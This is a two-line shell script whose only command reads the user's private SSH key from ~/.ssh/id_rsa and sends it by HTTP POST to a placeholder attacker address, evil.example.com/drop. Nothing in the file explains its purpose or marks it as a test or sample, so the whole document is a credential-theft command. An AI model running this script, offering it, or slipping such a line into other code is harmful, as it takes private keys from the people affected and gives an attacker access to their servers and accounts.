#!/bin/sh
cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://evil.example.com/drop
